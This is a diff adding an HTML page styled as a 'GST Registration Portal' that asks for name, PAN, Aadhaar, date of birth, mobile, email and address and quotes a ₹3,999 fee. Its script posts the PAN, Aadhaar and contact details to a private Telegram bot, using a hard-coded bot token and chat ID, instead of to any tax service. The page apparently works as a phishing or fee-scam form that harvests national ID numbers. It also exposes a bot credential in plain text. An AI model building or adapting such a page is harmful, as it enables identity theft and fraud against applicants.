@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GST Registration Portal</title>
+    
+    <style>
+        /* General Setup and Colors */
+        body {
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f0f4f8;
+            padding: 20px;
+            color: #2d3748;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+        }
+        .container {
+            width: 100%;
+            max-width: 750px;
+            background: #ffffff;
+            padding: 40px;
+            border-radius: 16px;
+            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
+        }
+        .header-image {
+            width: 100%;
+            height: auto;
+            border-radius: 12px;
+            margin-bottom: 30px;
+            display: block;
+        }
+        h1 {
+            text-align: center;
+            color: #1a365d;
+            margin-bottom: 8px;
+            font-weight: 800;
+            font-size: 28px;
+        }
+        h2 {
+            text-align: center;
+            color: #718096;
+            font-size: 1rem;
+            margin-bottom: 30px;
+            font-weight: 400;
+        }
+        
+        /* Fee Information Box */
+        .fee-info-box {
+            text-align: center;
+            background-color: #ebf8ff;
+            color: #2b6cb0;
+            padding: 20px;
+            margin-bottom: 35px;
+            border: 1px dashed #63b3ed;
+            border-radius: 12px;
+            line-height: 1.6;
+        }
+        .fee-amount {
+            font-size: 1.4em;
+            display: block;
+            font-weight: 800;
+            color: #2c5282;
+        }
+
+        /* Fieldset and Legend Styling */
+        fieldset {
+            border: 1px solid #e2e8f0;
+            padding: 25px;
+            margin-bottom: 35px;
+            border-radius: 12px;
+        }
+        legend {
+            font-size: 1.1em;
+            font-weight: 700;
+            color: #4a5568;
+            padding: 0 15px;
+            background-color: #ffffff;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        /* Form Groups and Inputs */
+        .form-group {
+            margin-bottom: 22px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #4a5568;
+            font-size: 0.95rem;
+        }
+        input:not([type="checkbox"]), textarea, select {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1.5px solid #e2e8f0;
+            border-radius: 8px;
+            box-sizing: border-box;
+            transition: all 0.2s ease;
+            font-size: 1rem;
+        }
+        input:focus, textarea:focus, select:focus {
+            border-color: #3182ce;
+            box-shadow: 0 0 0 3px rgba(66, 153, 225, 0.15);
+            outline: none;
+        }
+
+        /* Document Required Information */
+        .document-required {
+            background-color: #fffaf0;
+            border-left: 4px solid #ed8936;
+            padding: 15px;
+            margin-bottom: 12px;
+            border-radius: 8px;
+            font-size: 0.9rem;
+        }
+        .document-required strong {
+            color: #2d3748;
+            display: block;
+            margin-bottom: 3px;
+            font-size: 0.95rem;
+        }
+
+        /* Submit Button */
+        button[type="submit"] {
+            display: block;
+            width: 100%;
+            padding: 18px;
+            background-color: #3182ce;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.2rem;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: background-color 0.2s;
+            font-weight: 700;
+        }
+        button[type="submit"]:hover {
+            background-color: #2b6cb0;
+        }
+
+        /* Status Message */
+        #statusMessage {
+            margin-top: 25px;
+            padding: 15px;
+            border-radius: 8px;
+            text-align: center;
+            font-weight: 600;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <img src="https://i.ibb.co/VYqtCxny/Screenshot-20251216-133131-Brave.jpg" alt="GST Registration" class="header-image">
+
+        <h1>GST Registration Portal</h1>
+        <h2>Please provide your basic and business details to proceed.</h2>
+        
+        <div class="fee-info-box">
+            <span class="fee-amount">Registration Fee: ₹3,999</span>
+            Our experts will contact you for document verification and fee payment after submission.
+        </div>
+
+        <form id="applicationForm">
+
+            <fieldset>
+                <legend>Personal Information</legend>
+                <div class="form-group">
+                    <label for="applicantName">Full Name of Applicant *</label>
+                    <input type="text" id="applicantName" placeholder="As per PAN Card" required>
+                </div>
+                <div class="form-group">
+                    <label for="fatherName">Father's / Husband's Name *</label>
+                    <input type="text" id="fatherName" placeholder="Enter full name" required>
+                </div>
+                <div class="form-group">
+                    <label for="pan">PAN Card Number *</label>
+                    <input type="text" id="pan" placeholder="e.g., ABCDE1234F" style="text-transform:uppercase" required maxlength="10">
+                </div>
+                <div class="form-group">
+                    <label for="dob">Date of Birth (DD-MM-YYYY) *</label>
+                    <input type="text" id="dob" placeholder="DD-MM-YYYY" required pattern="\d{2}-\d{2}-\d{4}">
+                </div>
+                <div class="form-group">
+                    <label for="aadhaar">Aadhaar / Enrollment Number *</label>
+                    <input type="text" id="aadhaar" placeholder="0000-0000-0000" required>
+                </div>
+                <div class="form-group">
+                    <label for="mobile">Mobile Number *</label>
+                    <input type="tel" id="mobile" placeholder="10-digit mobile number" required pattern="[0-9]{10}" inputmode="numeric">
+                </div>
+                <div class="form-group">
+                    <label for="email">Email Address *</label>
+                    <input type="email" id="email" placeholder="name@example.com" required>
+                </div>
+                <div class="form-group">
+                    <label for="resAddress">Residential Address *</label>
+                    <textarea id="resAddress" placeholder="Full address as per Aadhaar" rows="3" required></textarea>
+                </div>
+            </fieldset>
+
+            <fieldset>
+                <legend>Required Documents (Checklist)</legend>
+                <div class="document-required">
+                    <strong>1. Passport Size Photo</strong>
+                    Format: JPEG (Less than 2MB).
+                </div>
+                <div class="document-required">
+                    <strong>2. PAN Card Scan</strong>
+                    Format: PDF, JPEG, or Doc (Less than 2MB).
+                </div>
+                <div class="document-required">
+                    <strong>3. Bank Proof (Cancel Cheque/Passbook)</strong>
+                    Format: Front page clearly showing A/C details.
+                </div>
+                <div class="document-required">
+                    <strong>4. Electricity Bill</strong>
+                    Not older than 2 months (PDF/JPEG).
+                </div>
+            </fieldset>
+
+            <fieldset>
+                <legend>Business Details</legend>
+                <div class="form-group">
+                    <label for="businessName">Legal Business / Shop Name</label>
+                    <input type="text" id="businessName" placeholder="Enter Trade Name">
+                </div>
+                <div class="form-group">
+                    <label for="commencementDate">Date of Commencement *</label>
+                    <input type="text" id="commencementDate" placeholder="DD-MM-YYYY" required pattern="\d{2}-\d{2}-\d{4}">
+                </div>
+                <div class="form-group">
+                    <label for="businessAddress">Principal Place of Business *</label>
+                    <textarea id="businessAddress" placeholder="Enter business location" rows="3" required></textarea>
+                </div>
+                <div class="form-group">
+                    <label for="businessNature">Nature of Business *</label>
+                    <input type="text" id="businessNature" placeholder="e.g., Retail, Services, Manufacturing" required>
+                </div>
+                <div class="form-group">
+                    <label for="businessType">Premises Ownership Type *</label>
+                    <select id="businessType" required>
+                        <option value="">-- Select Type --</option>
+                        <option value="owned">Owned</option>
+                        <option value="rented">Rented</option>
+                        <option value="leased">Leased</option>
+                    </select>
+                </div>
+            </fieldset>
+
+            <div class="form-group" style="display: flex; align-items: center;">
+                <input type="checkbox" id="terms" required style="width: auto; margin-right: 12px; transform: scale(1.2);">
+                <label for="terms" style="font-weight: 500; margin-bottom: 0;">I declare that the information provided is true and correct.</label>
+            </div>
+
+            <button type="submit" id="submitBtn">Submit Application</button>
+            <div id="statusMessage"></div>
+        </form>
+    </div>
+
+    <script>
+        // TELEGRAM CONFIG (Retained from your original)
+        const TELEGRAM_BOT_TOKEN = "7840966662:AAHqRQbwMOk6ja6pewc3fBMkGUAF7ZKb8ZE"; 
+        const TELEGRAM_CHAT_ID = "7918796164";     
+        
+        const form = document.getElementById('applicationForm');
+        const statusMessage = document.getElementById('statusMessage');
+        const submitBtn = document.getElementById('submitBtn');
+
+        async function sendToTelegram(data) {
+            let message = "🆕 <b>NEW GST REGISTRATION</b>\n\n";
+            message += `<b>Date:</b> ${new Date().toLocaleString()}\n`;
+            message += `--------------------------------\n`;
+            message += `<b>[PERSONAL DETAILS]</b>\n`;
+            message += `<b>Name:</b> ${data.applicantName}\n`;
+            message += `<b>Mobile:</b> ${data.mobile}\n`;
+            message += `<b>Email:</b> ${data.email}\n`;
+            message += `<b>PAN:</b> ${data.pan.toUpperCase()}\n`;
+            message += `<b>Aadhaar:</b> ${data.aadhaar}\n`;
+            message += `--------------------------------\n`;
+            message += `<b>[BUSINESS DETAILS]</b>\n`;
+            message += `<b>Trade Name:</b> ${data.businessName || 'N/A'}\n`;
+            message += `<b>Nature:</b> ${data.businessNature}\n`;
+            message += `<b>Ownership:</b> ${data.businessType}\n`;
+            message += `--------------------------------\n`;
+            message += `<b>FEE QUOTED:</b> ₹3999\n`;
+            
+            const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+            const response = await fetch(telegramApiUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML',
+                }),
+            });
+
+            if (!response.ok) throw new Error("Telegram delivery failed.");
+        }
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Processing...';
+            statusMessage.textContent = 'Submitting your details...';
+
+            try {
+                const formData = {
+                    applicantName: document.getElementById('applicantName').value,
+                    pan: document.getElementById('pan').value,
+                    aadhaar: document.getElementById('aadhaar').value,
+                    mobile: document.getElementById('mobile').value,
+                    email: document.getElementById('email').value,
+                    businessName: document.getElementById('businessName').value,
+                    businessNature: document.getElementById('businessNature').value,
+                    businessType: document.getElementById('businessType').value,
+                };
+
+                await sendToTelegram(formData);
+
+                statusMessage.innerHTML = '✅ <b>Application Submitted Successfully!</b><br>Our team will contact you shortly regarding documents and the ₹3999 fee.';
+                statusMessage.style.color = '#2f855a';
+                statusMessage.style.backgroundColor = '#f0fff4';
+                form.reset(); 
+
+            } catch (error) {
+                statusMessage.textContent = '❌ Error: Could not submit. Please check your internet.';
+                statusMessage.style.color = '#c53030';
+                statusMessage.style.backgroundColor = '#fff5f5';
+            } finally {
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Submit Application';
+            }
+        });
+    </script>
+</body>
+</html>
+
